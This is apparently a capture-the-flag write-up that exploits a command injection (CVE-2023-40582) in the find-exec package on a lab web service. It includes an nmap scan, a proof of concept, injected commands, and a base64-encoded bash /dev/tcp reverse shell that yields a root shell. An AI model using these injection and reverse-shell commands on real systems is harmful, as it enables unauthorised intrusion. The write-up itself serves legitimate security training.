## Enumeration:

```bash
nmap -sC -sV <IP>
```

```xml

#### Port 3000:

Visiting Port 3000 we get greeted by this page


![port3000.png](../../static/images/writeups/2023-12-27-CTF-200-05/port3000.png)

nothing too crazy here it just checks if the command exist,whats important here is to look at the bottom part of the webpage where it says `find-exec v1.0.2`

![find-execvuln.png](../../static/images/writeups/2023-12-27-CTF-200-05/find-execvuln.png)

that package is vulnerable to `CVE-2023-40582` [Command Injection in find-exec | CVE-2023-40582 | Snyk](https://security.snyk.io/vuln/SNYK-JS-FINDEXEC-5876637)

> POC

```js
const findexec = require('find-exec');
findexec("; touch hacked")
```

so what it means is we can do something like `cat;id` and after the cat is executed it executes the id command too. Using that we get the reverse shell 

## Root User:

Initially I ran just simple `cat; nc <IP> 7777` which did got a callback but wasn't responsive so it must be `-e` switch of nc causing the problem so we can just encode the payload and send it again

```bash
echo "/bin/bash -i >& /dev/tcp/<IP>/7777 0>&1" | base64
L2Jpbi9iYXNoIC1p{REDACTED}TY3Lzc3NzcgMD4mMQo=
```

and running that,

```bash
cat;echo "L2Jpbi9iYXNoIC1p{REDACTED}TY3Lzc3NzcgMD4mMQo=" | base64 -d | bash
```

we get a perfect root shell
